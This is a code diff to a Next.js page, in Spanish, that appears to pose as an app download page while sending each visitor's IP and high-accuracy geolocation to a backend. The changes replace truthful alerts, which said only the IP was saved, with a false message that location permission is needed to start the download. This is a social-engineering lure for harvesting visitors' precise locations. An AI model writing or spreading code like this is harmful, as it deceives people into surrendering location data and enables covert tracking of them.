@@ -13,7 +13,7 @@ export default function Home() {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ texto: `IP_ONLY-${ip}` }),
         });
-        alert('Ubicación no disponible. Se guardó solo la IP.');
+        alert('Se necesita habilitar permisos de ubicación para iniciar descarga');
         return;
       }
 
@@ -37,7 +37,7 @@ export default function Home() {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ texto: `IP_ONLY-${ip}` }),
           });
-          alert('No se pudo obtener la ubicación. Se guardó solo la IP.');
+          alert('Se necesita habilitar permisos de ubicación para iniciar descarga');
           console.error(error);
         },
         { enableHighAccuracy: true, timeout: 10000 }
@@ -79,7 +79,7 @@ export default function Home() {
           </button>
 
           <h2 className="text-lg md:text-xl font-extrabold mt-6">
-            También disponible para macOS, Android, iPhone (solo UE) y iPad (solo UE)
+            También disponible para macOS, Android, iPhone (solo EU) y iPad (solo EU)
           </h2>
         </div>
       </div>
